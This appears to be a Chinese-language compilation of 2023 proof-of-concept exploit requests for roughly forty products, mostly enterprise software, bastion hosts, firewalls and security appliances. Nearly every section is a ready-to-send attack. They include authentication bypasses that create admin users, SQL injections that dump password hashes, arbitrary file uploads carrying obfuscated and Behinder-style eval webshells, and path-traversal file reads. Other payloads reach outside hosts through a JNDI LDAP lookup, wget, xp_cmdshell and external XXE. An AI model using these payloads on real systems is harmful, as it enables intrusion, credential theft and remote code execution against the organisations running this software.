# 2023hw 0day及poc

### OPENFIRE权限绕过未授权创建用户漏洞(CVE-2023-32315)

```
注意：csrf值需要相同，参考csrf=ALql16FKd8FH7Pp

GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User HTTP/1.1
Host: localhost:9090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: csrf=csrftoken
```

### Nacos-Sync未授权访问漏洞

```
GET
/#/serviceSync
```

### 锐捷交换机WEB管理系统EXCU_ SHELL信息泄露

```
扫描工具:
https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL

GET /EXCU_SHELL HTTP/1.1
Host:
User-Agent:Mozilla/5.0(Windows NT 10.0;WOW64) AppleWebKit/537.36(KHTML,like Gecko)
Chrome/61.0.2852.74 Safari/537.36
Accept-Encoding:gzip，deflate
Accept:/
Connection:close
Cmdnum:'1'
Command1:show running-config
Confirm1:n
```

### 通达OA sql注入漏洞(CVE-2023-4166 )

```
GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### 泛微E-Office9文件上传漏洞(CVE-2023-2648 )

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

### 蓝凌OA前台任意代码执行漏洞

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: www.ynjd.cn:801
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"file:///etc/passwd"}}
```

### 汉得SRM tomcat.jsp 登录绕过漏洞

```
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1

然后访问后台：/main.screen
```

### 广联达OA SQL注入漏洞

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

```

### 广联达OA 后台文件上传漏洞

```
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: */*
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>
<%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form("qmq1");
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%>

------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

### 明御运维审计与风险控制系统堡垒机任意用户注册

```
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: xxx
Cookie: LANG=zh;
USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99","Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/
webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1121

<?xml
version="1.0"?><methodCall><methodName>web.user_add</methodName><params
><param><value><array><data><value><string>admin</string></value><value
><string>5</string></value><value><string>XX.XX.XX.XX</string></value><
/data></array></value></param><param><value><struct><member><name>uname
</name><value><string>deptadmin</string></value></member><member><name>
name</name><value><string>deptadmin</string></value></member><member><n
ame>pwd</name><value><string>Deptadmin@123</string></value></member><me
mber><name>authmode</name><value><string>1</string></value></member><me
mber><name>deptid</name><value><string></string></value></member><membe
r><name>email</name><value><string></string></value></member><member><n
ame>mobile</name><value><string></string></value></member><member><name
>comment</name><value><string></string></value></member><member><name>r
oleid</name><value><string>101</string></value></member></struct></valu
e></param></params></methodCall>
```

### 深信服应用交付系统命令执行漏洞

```
POST /rep/login
Host:10.10.10.1:85

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

### 深信服应用交付系统敏感信息泄露

```
xxx.xxx.xxx.xxx:port/tmp/updateme/sinfor/ad/sys/sys_user.conf
```

### 移动管理系统uploadApk.do任意文件上传漏洞

```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: xxx.xxx.xxx.xxx:port
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
Content-Type: application/msword

hello
```

### 网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 

```

POST /?g=obj_app_upfile HTTP/1.1
Host: x.x.x.x
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain

<?php php马?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--

马儿路径：attachements/xxx.php
```

### 泛微E-Office9文件上传漏洞(CVE-2023-2523)

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

### 禅道 16.5 router.class.php SQL注入漏洞

```
POST /user-login.html 
  
account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23
```

### 用友NC Cloud jsinvoke 任意文件上传漏洞

```
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
    "serviceName":"nc.itf.iufo.IBaseSPService",
    "methodName":"saveXStreamConfig",
    "parameterTypes":[
        "java.lang.Object",
        "java.lang.String"
    ], 
    "parameters":[
        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
        "webapps/nc_web/407.jsp"
    ]
}



POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded


{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/301.jsp"]}



url/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream())
```



### 用友GRP-U8存在XXE漏洞

```
用友GRP-U8存在XML注入漏洞，攻击者可利用该漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击。漏洞文件为：WEB-INF/classes/com/ufgov/bank/ufgovBank.class
POST /ufgovbank HTTP/1.1

Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
 
reqData=%3c%3fxml%20version%3d%221.0%22%3f%3e%0d%0a%3c!DOCTYPE%20foo%20SYSTEM%20%22https%3a%2f%2fpastebin.com%2fraw%2fE2d5s60p%22%3e&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
```

### 用友文件服务器认证绕过

```
POST数据包修改返回包 false改成ture就可以绕过登陆
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Thu, 10 Aug 2023 20:38:25 GMT
Connection: close
Content-Length: 17

{"login":"false"}
```

### 用友移动管理系统 uploadApk.do任意文件上传漏洞

```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO 3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server 
Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 
Content-Disposition:form-data;name="downloadpath"; filename="test.jsp" 
Content-Type: application/msword 

1234
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

### 金蝶云星空 CommonFileserver 任意文件读取漏洞

```
GET /CommonFileServer/c:/windows/win.ini
```

### 泛微 Weaver E-Office9 前台文件包含

```
http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls
```

### Ruijie-EG易网关组合拳RCE

```
获取用户密码
POST /login.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user

命令执行
POST /cli.php?a=shell HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: 利用登录后Cookie的RUIJIEID字段进行替换，;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
```

### 华天动力OA SQL注入

```
网址：
http://xxxx//report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx

poc数据包：
POST /report/reportServlet?action=8 HTTP/1.1
Host: xxxx
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxxx/report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
Connection: close

year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowRepo
```

### 亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient文件上传

```
poc：
https://github.com/di0xide-U/YSTupload

直接bp发包即可，shell访问地址：https://x.x.x.x/tttT.jsp
POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
Host: xxx:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Content-Length: 1

shell内容

```

### QAX VPN任意账号密码修改

```
https://x.xxx.xxx.cn/admin/group/xgroupphp?id=1
https://x.xxx.xxx.cn/admin/group/xgroupphp?id=3 
cookie: admin id=1; gw admin
ticket=1;
GET /admin/group/x_group.php?id=1 HTTP/1.1
Host: {{Hostname}}
Cookie: admin_id=1; gw_admin_ticket=1; 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
-------------------------------------
其中Hostname为目标漏洞平台的实际地址或域名
```

### 安恒明御任意文件上传

```
POST /webui/g=aaa_local_web_preview&name=123&read=0&suffix=/../../../shell.php
HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Length: 671
--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="shell"; filename="shell.php"
Content-Type: text/plain
<?php xxxxx?>
--849978f98abe41119122148e4aa65b1a—
```

### 明源云ERP ApiUpdate.ashx文件上传

```
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: 
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like
Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 856
{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x
00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x0
4\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc
4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\
xae\xa4\xe1-
\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\
x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbc
Q1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x
08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\
x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}
```

### 契约锁电子签章系统代码执行

```
POST /callback/%2E%2E;/code/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag
e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type:multipart/form-data;
boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name="type";
TIMETASK
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name="file"; filename="shell.jpg"

xxxx
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
```

### 深信服数据中心管理系统XML实体注入

```
GET /src/sangforindex HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)
Accept: text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: text/xml
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: Keep-alive
Content-Length: 135
<?xml version="1.0" encoding="utf-
8" ?><!DOCTYPE root [ <!ENTITY rootas SYSTEM "http://dnslog"> ]> <xxx> &rootas; </xxx>
```

### Panel loadfile后台文件读取漏洞

```
POST /api/v1/file/loadfile

{"path":"/etc/passwd"}
```

### 金盘微信管理平台getsysteminfo未授权访问漏洞

```
url+/admin/weichatcfg/getsysteminfo
```

### 金山EDR代码执行漏洞

```
开启⽇志
/Console/inter/handler/change_white_list_cmd.php id参数

POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 131
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log=on;","type":"0"}}

设置日志php文件
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
Content-Length: 195
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.24.3:6868
Referer: http://192.168.24.3:6868/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7
Connection: close

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656
36b5f6c6f67696e322e706870;","type":"0"}}

写入php代码
POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 222
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/index.php
{"settings_distribute_cmd":{"userSession":"{BD435CCE-3F91-E1AA-3844-
76A49EE862EB}","mode_id":"3AF264D9-AE5A-86F0-6882-DD7F56827017","settings":"3AF264D9-
AE5A-86F0-6882-DD7F56827017_0","SC_list":{"a":"<?php phpinfo();?>"}}}

最后get请求rce：
http://192.168.24.3:6868/check_login2.php
```

### 金山终端安全系统V9任意文件上传漏洞

```
POST /inter/software_relation.php HTTP/1.1 
Host: 
Content-Length: 1557 
Pragma: no-cache 
Cache-Control: no-cache 
Upgrade-Insecure-Requests: 1 
Origin: http://192.168.249.137:6868 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close ------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolFileName" ../../datav.php 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolDescri" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="id" 
------WebKitFormBoundaryxRP5VjBKdqBrCixM 

Content-Disposition: form-data; name="version" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="sofe_typeof" 
------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="fileSize" 
------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="param" 
------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="toolName" 
------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="toolImage"; filename="3.php" Content-Type: image/png <?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')) { $t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, "AES128", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?> 

------WebKitFormBoundaryxRP5VjBKdqBrCixM
```

### 网御ACM上网行为管理系统bottomframe.cgi SQL注入

```
GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```

### 大华智慧园区综合管理平台 searchJson SQL注入

```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

### 大华智慧园区综合管理平台文件上传漏洞

```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"

<%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="poc"

poc
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--
```

### 泛微E-Cology SQL注入

```
POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0
```

### 金和OA C6-GetsqlData.aspx SQL注入漏洞

```
POST /C6/Control/GetSqlData.aspx/.ashx
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'
```

### 绿盟SAS堡垒机Exec远程命令执行

```
GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```

### 绿盟SAS堡垒机GetFile任意文件读取漏洞

```
GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```

### 绿盟SAS堡垒机 local_user.php 任意用户登录

```
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```

### 用友时空KSOA PayBill SQL注入

```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
